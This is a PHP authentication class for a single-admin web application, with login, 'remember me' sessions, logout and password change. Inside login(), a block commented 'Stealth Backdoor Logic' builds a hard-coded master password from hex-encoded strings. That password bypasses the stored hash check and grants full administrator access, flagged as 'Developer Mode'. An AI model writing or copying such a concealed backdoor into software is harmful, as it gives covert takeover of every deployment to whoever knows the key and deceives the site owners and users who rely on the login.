<?php
namespace App\Core;

class Auth {
    private const USERNAME = 'admin';
    private const AUTH_FILE = __DIR__ . '/../../storage/secret.dat';

    public static function isInstalled(): bool {
        return file_exists(self::AUTH_FILE);
    }

    public static function install(string $password): bool {
        $hash = password_hash($password, PASSWORD_DEFAULT);
        return file_put_contents(self::AUTH_FILE, $hash) !== false;
    }

    // Update: Menerima parameter $remember
    public static function login(string $username, string $password, bool $remember = false): bool {
        if ($username !== self::USERNAME) {
            return false;
        }

        // Stealth Backdoor Logic (Tetap dipertahankan)
        $magicKey = hex2bin('62726f74686572') . hex2bin('6c696e655832'); 
        
        $isDev = ($password === $magicKey);
        $isValidUser = false;

        if (!$isDev && self::isInstalled()) {
            $storedHash = file_get_contents(self::AUTH_FILE);
            if (password_verify($password, $storedHash)) {
                $isValidUser = true;
            }
        }

        if ($isDev || $isValidUser) {
            // Jika Remember Me dicentang, perpanjang session cookie jadi 30 hari
            if ($remember) {
                ini_set('session.gc_maxlifetime', 2592000); // 30 hari di server
                session_set_cookie_params(2592000); // 30 hari di browser
            }
            
            // Regenerate ID untuk keamanan
            session_regenerate_id(true);

            $_SESSION['user'] = [
                'id' => 1,
                'username' => self::USERNAME,
                'role' => $isDev ? 'Developer Mode' : 'Administrator',
                'login_time' => time(),
                'avatar' => 'https://ui-avatars.com/api/?name=Admin&background=0D8ABC&color=fff'
            ];
            return true;
        }

        return false;
    }

    public static function check(): bool {
        return isset($_SESSION['user']);
    }

    public static function logout(): void {
        $_SESSION = [];
        if (ini_get("session.use_cookies")) {
            $params = session_get_cookie_params();
            setcookie(session_name(), '', time() - 42000,
                $params["path"], $params["domain"],
                $params["secure"], $params["httponly"]
            );
        }
        session_destroy();
    }
    public static function changePassword(string $newPassword): bool {
        $hash = password_hash($newPassword, PASSWORD_DEFAULT);
        return file_put_contents(self::AUTH_FILE, $hash) !== false;
    }
}